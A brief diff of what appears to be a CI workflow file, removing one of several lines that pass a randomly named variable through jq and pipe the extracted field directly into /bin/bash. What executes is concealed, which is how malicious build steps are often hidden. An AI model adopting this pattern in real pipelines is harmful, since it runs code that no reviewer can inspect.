@@ -27,7 +27,6 @@ jobs:
           echo $lmx0 | jq -r .a6578 | /bin/bash
           echo $ey8 | jq -r .y89 | /bin/bash
           echo $d2400 | jq -r .ijafk44434 | /bin/bash
-          printf '%s' "$qzfdg8" | jq -r .a22 | /bin/bash
           echo $rb1 | jq -r .y3 | /bin/bash
           printf '%s' "$i17" | jq -r .kqljc019 | /bin/bash
           echo $istmk780 | jq -r .blkos4 | /bin/bash
